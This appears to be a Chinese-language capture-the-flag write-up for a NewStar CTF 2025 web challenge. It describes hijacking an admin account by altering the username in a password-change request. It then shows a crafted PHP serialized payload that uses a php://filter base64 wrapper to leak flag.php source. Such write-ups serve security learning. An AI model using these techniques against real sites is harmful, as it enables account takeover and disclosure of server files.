---
titleTemplate: ":title | WriteUp - NewStar CTF 2025"
---

# Binary Blog

首先我们先注册一个用户去看看其整体框架

同时用 dirsearch 去扫一下

![1](/assets/images/wp/2025/week5/abandoned-site_1.png)

这里看到 `flag.php` 文件推测，flag 应该就在这里

然后我们在主页中看到 admin 账户

![2](/assets/images/wp/2025/week5/abandoned-site_2.png)

但是强制爆破没成功，推测可能需要提权或者越权

![3](/assets/images/wp/2025/week5/abandoned-site_3.png)

接着我们在个人信息中抓到这个包，然后尝试修改

这里我们发现从修改 id 和 name 都无法修改成为 admin 用户

接着我们尝试从另一个入口（修改密码）处如何看看

![4](/assets/images/wp/2025/week5/abandoned-site_4.png)

发现这个和上面的情况不一样，尝试修改 username 为 admin 试试

![5](/assets/images/wp/2025/week5/abandoned-site_5.png)

可以发现用户 admin 密码成功修改成 123456q 了

之后尝试登录 admin:123456q

![6](/assets/images/wp/2025/week5/abandoned-site_6.png)

成功登录，接着我们继续看看其接口情况

![7](/assets/images/wp/2025/week5/abandoned-site_7.png)

然后我们在博客管理界面发现能够上传文件，推测是文件上传漏洞，同时还有导出功能，先导出下来看看情况

![8](/assets/images/wp/2025/week5/abandoned-site_8.png)

这里我们发现这不是反序列内容嘛，大概率这题就是反序列了，而不是文件上传。

同时我们在

![9](/assets/images/wp/2025/week5/abandoned-site_9.png)

![10](/assets/images/wp/2025/week5/abandoned-site_10.png)

这里发现一个 PHP 文件，同时在页面中也有个迷惑的提示，于是我们可以尝试写入 `flag.php` 文件，发现没有成功，于是我们尝试其他方法——构造伪协议

根据反序列构造 payload

```php
a:4:{s:9:"timestamp";i:1759054823;s:7:"version";s:3:"1.0";s:4:"blog";O:4:"Blog":8:{s:2:"id";i:1;s:5:"title";s:24:"欢迎使用博客系统";s:7:"content";s:280:"这是一个功能完整的博客系统，您可以在这里发布、编辑和管理您的博客内容。

系统特点：
- 支持用户注册和登录
- 管理员可以管理所有用户和博客
- 支持富文本编辑
- 响应式设计，适配各种设备

开始使用吧！";s:7:"user_id";i:1;s:8:"username";s:5:"admin";s:10:"created_at";s:19:"2025-09-28 18:02:36";s:10:"updated_at";s:19:"2025-09-28 18:02:36";s:8:"template";s:57:"php://filter/read=convert.base64-encode/resource=flag.php";}s:9:"signature";s:64:"231d1e254f4cdd5ac689fbac0fb0b2722cbcc2fcc3a13d7b0203ca674f1a46a8";}
```

修改 template 为 `php://filter/read=convert.base64-encode/resource=flag.php` 来泄露 `flag.php` 的源码

得到 flag

![11](/assets/images/wp/2025/week5/abandoned-site_11.png)

![12](/assets/images/wp/2025/week5/abandoned-site_12.png)
